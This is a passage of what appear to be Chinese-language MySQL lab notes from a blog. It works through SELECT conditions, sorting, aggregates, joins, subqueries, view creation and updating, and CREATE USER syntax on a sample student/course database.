class="line">+---------+----------------+----------+------------+</span><br><span class="line">5 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT DISTINCT SNO FROM SC; //查询有选修课程的学号并去重</span><br><span class="line">+-----------+                      </span><br><span class="line">| SNO       |                      </span><br><span class="line">+-----------+                      </span><br><span class="line">| 201215121 |                      </span><br><span class="line">| 201215122 |                      </span><br><span class="line">+-----------+                      </span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><h4 id="条件查询"><a href="#条件查询" class="headerlink" title="条件查询"></a>条件查询</h4><p><img src="C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317114810992.png" alt="image-20200317114810992"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Sno,Sname from student where Sdept=&apos;MATH&apos;; //查询数学系学生信息</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sage,Sname from student where Sage BETWEEN 18 AND 22; //查询年龄区间 18-22 的学生信息</span><br><span class="line">mysql&gt; select Sage,Sname from student where Sage NOT BETWEEN 18 AND 22; // 查询年龄范围之外的学生信息</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Sno from student where Sdept in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;); // 查询目标院系学生信息</span><br><span class="line">mysql&gt; select Sname,Sno from student where Sdept NOT in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;);</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu%&apos;; //查询姓名以 Liu 开头的学生信息。 % 代表任意长度</span><br><span class="line">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu___&apos;; //查询限定长度的姓名信息。_ 代表任意单个字符</span><br></pre></td></tr></table></figure><p>如果要查询的字符串本身含有通配符 <code>%</code> 或 <code>_</code> ,这时就要使用 <code>ESCAPE</code> 对其转义处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_Design&apos; ESCAPE &apos;/&apos;;</span><br><span class="line">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_%i_&apos; ESCAPE &apos;/&apos;; DB开头，倒数第二个为 i 。</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT Sno,Cno</span><br><span class="line">    -&gt; FROM SC</span><br><span class="line">    -&gt; WHERE Grade IS NULL;  // 参加考试但没有考试成绩</span><br><span class="line">mysql&gt; SELECT Sno,Cno</span><br><span class="line">    -&gt; FROM SC</span><br><span class="line">    -&gt; WHERE Grade IS NOT NULL; // 所有有成绩的学生信息</span><br></pre></td></tr></table></figure><h4 id="ORDER-BY-字句"><a href="#ORDER-BY-字句" class="headerlink" title="ORDER BY 字句"></a>ORDER BY 字句</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Sno,Grade FROM SC WHERE Cno=&apos;3&apos; order by Grade desc; // 按成绩降序排列选修 Cno=3 的学生信息</span><br><span class="line">mysql&gt; SELECT * FROM student ORDER BY Sdept,Sage DESC; // 所在系号升序，同一系学生年龄按降序。</span><br><span class="line">+-----------+---------+--------+------+-------+</span><br><span class="line">| Sno       | Sname   | Ssex   | Sage | Sdept |</span><br><span class="line">+-----------+---------+--------+------+-------+</span><br><span class="line">| 201215121 | LiYong  | male   |   20 | CS    |</span><br><span class="line">| 201215122 | LiuChen | female |   19 | CS    |</span><br><span class="line">| 201215123 | WangMin | female |   18 | CS    |</span><br><span class="line">| 201215125 | ZhangLi | male   |   19 | IS    |</span><br><span class="line">| 201215124 | JingYu  | male   |   27 | MATH  |</span><br><span class="line">+-----------+---------+--------+------+-------+</span><br><span class="line"></span><br><span class="line">未对查询结果分组，聚集函数将作用于整个查询结果。分组后将作用于每一组。</span><br><span class="line">mysql&gt; select Cno,count(Sno) from sc group by Cno; //求各个课程号(Cno)及相应的选课人数</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sno from sc group by Sno HAVING COUNT(*) &gt;=3;</span><br><span class="line">+-----------+</span><br><span class="line">| Sno       |</span><br><span class="line">+-----------+</span><br><span class="line">| 201215121 |</span><br><span class="line">+-----------+</span><br><span class="line">1 row in set (0.00 sec) //查询选修了3门或3门以上课程的学生学号(Sno)</span><br><span class="line">WHERE 子句作用于基本表或视图，从中选择满足条件的元组，HAVING  短语作用于组，从中选择满足条件的组。</span><br></pre></td></tr></table></figure><h4 id="集函数的使用"><a href="#集函数的使用" class="headerlink" title="集函数的使用"></a>集函数的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SQL提供许多聚集函数，主要有：</span><br><span class="line">- COUNT(*)                     统计元组个数</span><br><span class="line">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class="line">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class="line">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class="line">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class="line">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class="line">DISTINCT 短语对结果去重，默认 ALL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select count(*) from student;  //查询学生总人数</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class="line"></span><br><span class="line">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class="line"></span><br><span class="line">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure><h4 id="连接查询"><a href="#连接查询" class="headerlink" title="连接查询"></a>连接查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Sname from student,sc where student.Sno=SC.Sno AND cno=&apos;2&apos; and Grade&gt;=90; // 查询选2门课且成绩大于90</span><br><span class="line"></span><br><span class="line">mysql&gt; select first.Cno,second.Cpno from course first,course second where first.Cpno=second.Cno; //自身连接 找到选修的选修课</span><br><span class="line">+-----+------+</span><br><span class="line">| Cno | Cpno |</span><br><span class="line">+-----+------+</span><br><span class="line">| 1   | 7    |</span><br><span class="line">| 3   | 5    |</span><br><span class="line">| 4   |      |</span><br><span class="line">| 5   | 6    |</span><br><span class="line">| 7   |      |</span><br><span class="line">+-----+------+</span><br><span class="line"></span><br><span class="line">mysql&gt; SELECT Sname,Sage </span><br><span class="line">from student,course,sc </span><br><span class="line">where student.Sno=sc.Sno AND sc.Cno=course.Cno </span><br><span class="line">AND Cname=&apos;database&apos;;//三表连接查询，查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Sage from student,sc where sc.Sno=student.Sno;  //查询每个学生及其选修课程的情况。</span><br><span class="line"></span><br><span class="line">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class="line">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br></pre></td></tr></table></figure><h4 id="集合查询"><a href="#集合查询" class="headerlink" title="集合查询"></a>集合查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from student where Sdept=&apos;CS&apos; union select * from student where Sage&lt;=19; //UNION 联合查询，自动去重 查询计算机科学系的学生或年龄不大于20岁的学生信息。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;CS&apos; or Sage&lt;=&apos;20&apos;; //查询计算机科学系的学生或年龄不大于20岁的学生信息</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;math&apos; and Sage&lt;=&apos;20&apos;; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from student where Sdept=&apos;math&apos; intersect select * from student where Sage&lt;=19; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from student where Sdept=&apos;math&apos; execpt select * from student where Sage&lt;=19;//查询数学系的学生与年龄不大于20岁的学生的差集。</span><br><span class="line"></span><br><span class="line">INTERSECT 交操作 &amp; EXCEPT 差操作，在mysql中还不支持，一般用 not in 代替实现</span><br></pre></td></tr></table></figure><h4 id="嵌套查询"><a href="#嵌套查询" class="headerlink" title="嵌套查询"></a>嵌套查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; SELECT Sname,Sage </span><br><span class="line">FROM student </span><br><span class="line">WHERE Sno IN </span><br><span class="line">    (SELECT Sno </span><br><span class="line">    from sc </span><br><span class="line">    WHERE Cno IN </span><br><span class="line">        (SELECT Cno </span><br><span class="line">        from course </span><br><span class="line">        where Cname=&apos;database&apos;</span><br><span class="line">        )</span><br><span class="line">    ); //跨三个表查询，实现的效果与多表连接效果一样。查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class="line">    </span><br><span class="line">mysql&gt; select student.Sno,Sname from student,course,sc where student.Sno=sc.Sno AND sc.Cno=course.Cno AND course.Cname=&apos;math&apos;; //查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br></pre></td></tr></table></figure><h4 id="带-IN-和-ALL-的子查询"><a href="#带-IN-和-ALL-的子查询" class="headerlink" title="带 IN 和 ALL 的子查询"></a>带 <code>IN</code> 和 <code>ALL</code> 的子查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Sname,Sage from student where Sage &lt;= ANY (select Sage from student where Sdept=&apos;IS&apos;); //查询非自动化系的不超过自动化系所有学生的年龄的学生姓名(Sname)和年龄(Sage)。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class="line">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br><span class="line">此查询为不相关子查询，子查询条件不依赖于父条件。</span><br></pre></td></tr></table></figure><h4 id="基于派生表的查询"><a href="#基于派生表的查询" class="headerlink" title="基于派生表的查询"></a>基于派生表的查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="sql高级查询"><a href="#sql高级查询" class="headerlink" title="sql高级查询"></a><code>sql</code>高级查询</h3><h4 id="聚集函数的使用"><a href="#聚集函数的使用" class="headerlink" title="聚集函数的使用"></a>聚集函数的使用</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">SQL提供许多聚集函数，主要有：</span><br><span class="line">- COUNT(*)                     统计元组个数</span><br><span class="line">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class="line">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class="line">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class="line">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class="line">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class="line">DISTINCT 短语对结果去重，默认 ALL</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">select count(*) from student;  //查询学生总人数</span><br><span class="line"></span><br><span class="line">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class="line"></span><br><span class="line">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class="line"></span><br><span class="line">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure><h4 id="查询结果分组"><a href="#查询结果分组" class="headerlink" title="查询结果分组"></a>查询结果分组</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Cno,count(Sno) from sc group by Cno;</span><br><span class="line">//求每门课的课程号(Cno)及相应的选课人数。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sno from sc having count(Cno)&gt;=3;</span><br><span class="line">//查询选修了3门或3门以上课程的学生学号(Sno)。</span><br><span class="line">这个是不对的，只是结果看起来对</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sno from sc group by Sno having count(*)=3; //查询选修了3门或3门以上课程的学生学号(Sno)。</span><br></pre></td></tr></table></figure><h4 id="不同表之间的连接查询"><a href="#不同表之间的连接查询" class="headerlink" title="不同表之间的连接查询"></a>不同表之间的连接查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select student.Sname,student.Sdept,course.Cname from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno; //查询每个学生及其选修课程的情况。</span><br><span class="line"></span><br><span class="line">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class="line">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br><span class="line"></span><br><span class="line">mysql&gt; select student.Sno,student.Sname,course.Cname,sc.Grade from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno and sc.Grade&gt;=90;//查询考试成绩在90分以上的学生学号(Sno)、姓名(Sname)、选修的课程名(Cname)</span><br></pre></td></tr></table></figure><h4 id="带谓词-IN-的嵌套查询"><a href="#带谓词-IN-的嵌套查询" class="headerlink" title="带谓词 IN 的嵌套查询"></a>带谓词 IN 的嵌套查询</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class="line"></span><br><span class="line">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class="line">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br></pre></td></tr></table></figure><h2 id="视图"><a href="#视图" class="headerlink" title="视图"></a>视图</h2><h3 id="建立视图"><a href="#建立视图" class="headerlink" title="建立视图"></a>建立视图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">1.1建立数学系学生的视图math_stu，并要求进行修改和插入操作时仍需保证该视图只有数学系的学生，视图的属性名为Sno，Sname，Sage，Sdept。</span><br><span class="line">mysql&gt; create view math_stu</span><br><span class="line">    -&gt; as select</span><br><span class="line">    -&gt; Sno,Sname,Sage,Sdept</span><br><span class="line">    -&gt; from student where Sdept=&apos;MATH&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.16 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from math_stu;</span><br><span class="line">+-----------+--------+------+-------+</span><br><span class="line">| Sno       | Sname  | Sage | Sdept |</span><br><span class="line">+-----------+--------+------+-------+</span><br><span class="line">| 201215124 | JingYu |   27 | MATH  |</span><br><span class="line">+-----------+--------+------+-------+</span><br><span class="line">1 row in set (0.10 sec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1.2  建立学生的学号(Sno)、姓名(Sname)、选修课程名(Cname)及成绩(Grade)的视图grade_stu。</span><br><span class="line">mysql&gt; create view grade_stu</span><br><span class="line">    -&gt; as select</span><br><span class="line">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class="line">    -&gt; from student s,course c,sc;</span><br><span class="line">Query OK, 0 rows affected (0.12 sec)</span><br><span class="line"></span><br><span class="line">这种方法创建完之后我们发现存在大量重复且错误的数据,猜想是因为没有指定表之间的关系导致的。下面这个是正确的查询方式。</span><br><span class="line">mysql&gt; create view grade_stu</span><br><span class="line">    -&gt; as select</span><br><span class="line">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class="line">    -&gt; from student s,course c,sc</span><br><span class="line">    -&gt; where s.Sno=sc.Sno and c.Cno=sc.Cno;</span><br><span class="line">Query OK, 0 rows affected (0.12 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from grade_stu;</span><br><span class="line">+-----------+---------+------------+-------+</span><br><span class="line">| Sno       | Sname   | Cname      | Grade |</span><br><span class="line">+-----------+---------+------------+-------+</span><br><span class="line">| 201215121 | LiYong  | database   |    92 |</span><br><span class="line">| 201215121 | LiYong  | infosystem |    85 |</span><br><span class="line">| 201215121 | LiYong  | math       |    88 |</span><br><span class="line">| 201215122 | LiuChen | math       |    90 |</span><br><span class="line">| 201215122 | LiuChen | infosystem |    80 |</span><br><span class="line">+-----------+---------+------------+-------+</span><br><span class="line">5 rows in set (0.33 sec)</span><br><span class="line"></span><br><span class="line">我们还可以尝试 left join &amp; right join 的方式，本质上完全一样：</span><br><span class="line"></span><br><span class="line">mysql&gt; create view grade_stu</span><br><span class="line">    -&gt; as select</span><br><span class="line">    -&gt; s.Sno,s.Sname,c.Cname,sc.Grade</span><br><span class="line">    -&gt; from sc</span><br><span class="line">    -&gt; left join student s on s.Sno=sc.Sno</span><br><span class="line">    -&gt; left join course c on c.Cno=sc.Cno;</span><br><span class="line">Query OK, 0 rows affected (0.11 sec)</span><br><span class="line"></span><br><span class="line">1.3  定义一个反映学生出生年份的视图Student_birth。</span><br><span class="line">mysql&gt; create view Student_brith (s_name,s_brith) as select Sname,2020-student.Sage from student;</span><br><span class="line"></span><br><span class="line">1.4 定义一个视图AVGG，视图列中有课程号、这门课程的平均成绩，且平均成绩大于80分。</span><br><span class="line">mysql&gt; create view AVGG (cno,avg_grade) as select Cno,AVG(Grade) from sc group by Cno HAVING AVG(Grade)&gt;80;</span><br></pre></td></tr></table></figure><h3 id="删除视图"><a href="#删除视图" class="headerlink" title="删除视图"></a>删除视图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; drop view if exists grade_stu;</span><br></pre></td></tr></table></figure><h3 id="查询视图"><a href="#查询视图" class="headerlink" title="查询视图"></a>查询视图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">3.1 在数学系的学生视图math_stu中找出年龄(Sage)小于20岁的学生姓名(Sname)和年龄(Sage)。</span><br><span class="line">mysql&gt; select Sname,Sage from math_stu where Sage&lt;20;</span><br><span class="line"></span><br><span class="line">3.2  在grade_stu视图中查询成绩在85分以上的学生学号(Sno)、姓名(Sname)和课程名称(Cname)。</span><br><span class="line">mysql&gt; select Sno,Sname,Cname from grade_stu where Grade&gt;85;</span><br></pre></td></tr></table></figure><h3 id="更新视图"><a href="#更新视图" class="headerlink" title="更新视图"></a>更新视图</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">语法：ALTER VIEW &lt;视图名&gt; AS &lt;SELECT语句&gt;</span><br></pre></td></tr></table></figure><p>需要注意的是，对于 ALTER VIEW 语句的使用，需要用户具有针对视图的 CREATE VIEW 和 DROP 权限，以及由 SELECT 语句选择的每一列上的某些权限。</p><p> 修改视图的定义，除了可以通过 ALTER VIEW 外，也可以使用 DROP VIEW 语句先删除视图，再使用 CREATE VIEW 语句来实现。</p><p>视图是一个虚拟表，实际的数据来自于基本表，所以通过插入、修改和删除操作更新视图中的数据，实质上是在更新视图所引用的基本表的数据。</p><p>注意：对视图的修改就是对基本表的修改，因此在修改时，要满足基本表的数据定义。</p><p>某些视图是可更新的。也就是说，可以使用 UPDATE、DELETE 或 INSERT 等语句更新基本表的内容。对于可更新的视图，视图中的行和基本表的行之间必须具有一对一的关系。</p><p>还有一些特定的其他结构，这些结构会使得视图不可更新。更具体地讲，如果视图包含以下结构中的任何一种，它就是不可更新的：</p><ul><li>聚合函数 SUM()、MIN()、MAX()、COUNT() 等。</li><li>DISTINCT 关键字。</li><li>GROUP BY 子句。</li><li>HAVING 子句。</li><li>UNION 或 UNION ALL 运算符。</li><li>位于选择列表中的子查询。</li><li>FROM 子句中的不可更新视图或包含多个表。</li><li>WHERE 子句中的子查询，引用 FROM 子句中的表。</li><li>ALGORITHM 选项为 TEMPTABLE（使用临时表总会使视图成为不可更新的）的时候。</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">4.1 将数学系学生视图math_stu中学号为200215123的学生姓名改为“黄海”。</span><br><span class="line">mysql&gt; update math_stu set Sname=&apos;huanghai&apos; where Sno=&apos;201215124&apos;;</span><br><span class="line">我们再去查询基本表发现 studnet 表中的数据已经被修改。</span><br><span class="line"></span><br><span class="line">4.2  向数学系学生视图math_stu中插入一个新的学生记录，其中学号为“S09”，姓名为“王海”，年龄为20岁。</span><br><span class="line">mysql&gt; INSERT INTO math_stu (Sno,Sname,Sage,Sdept) values (&apos;s09&apos;,&apos;wanghai&apos;,20,&apos;MATH&apos;);</span><br></pre></td></tr></table></figure><h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><h3 id="创建用户"><a href="#创建用户" class="headerlink" title="创建用户"></a>创建用户</h3><p>可以使用 CREATE USER 语句来创建一个或多个 MySQL 账户，并设置相应的口令。</p><p> 语法格式：</p><p><code>CREATE USER &lt;用户名&gt; [ IDENTIFIED ] BY [ PASSWORD ] &lt;口令&gt;</code></p><p>语法说明如下：</p><p> 1) &lt;用户名&gt;</p><p>指定创建用户账号，格式为 ‘user_name’@’host_name’。这里<code>user_name</code>是用户名，<code>host_name</code>为主机名，即用户连接 MySQL 时所在主机的名字。若在创建的过程中，只给出了账户的用户名，而没指定主机名，则主机名默认为“%”，表示一组主机。</p><p> 2) PASSWORD</p><p>可选项，用于指定散列口令，即若使用明文设置口令，则需忽略<code>PASSWORD</code>关键字；若不想以明文设置口令，且知道 PASSWORD() 函数返回给密码的散列值，则可以在口令设置语句中指定此散列值，但需要加上关键字<code>PASSWORD</code>。</p><p> 3) IDENTIFIED BY子句</p><p>用于指定用户账号对应的口令，若该用户账号无口令，则可省略此子句。</p><p> 4) &lt;口令&gt;</p><p>指定用户账号的口令，在<code>IDENTIFIED BY</code>关键字或<code>PASSWOED</code>关键字之后。给定的口令值可以是只由字母和数字组成的明文，也可以是通过 PASSWORD() 函数得到的散列值。</p><p> 使用 CREATE USER 语句应该注意以下几点：</p><ul><li>如果使用 CREATE USER 语句时没有为用户指定口令，那么 MySQL 允许该用户可以不使用口令登录系统，然而从安全的角度而言，不推荐这种做法。</li><li>使用 CREATE USER 语句必须拥有 MySQL 中 MySQL 数据库的 INSERT 权限或全局 CREATE USER 权限。</li><li>使用 CREATE USER 语句创建一个用户账号后，会在系统自身的 MySQL 数据库的 user 表中添加一条新记录。若创建的账户已经存在，则语句执行时会出现错误。</li><li>新创建的用户拥有的权限很少。他们可以登录 MySQL，只允许进行不需要权限的操作，如使用 SHOW 语句查询所有存储引擎和字符集的列表等。</li></ul><p> 如果两个用户具有相同的用户名和不同的主机名，MySQL 会将他们视为不同的用户，并允许为这两个用户分配不同的权限集合。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">5.1创建两个用户，一个以你的名字（汉语拼音）命名的用户，登陆名也为你的名字（汉语拼音），另一个为你同学（汉语拼音）的名字命名的一个用户，登录名为你同学的名字（汉语拼音）。</span><br><span class="line">mysql&gt; create user &apos;brain&apos;@&apos;localhost&apos; identified by &apos;123456&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; create user &apos;fuck&apos;@&apos;localhost&apos; identified by &apos;321654&apos;;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br></pre></td></tr></table></figure><h3 id="用户权限"><a 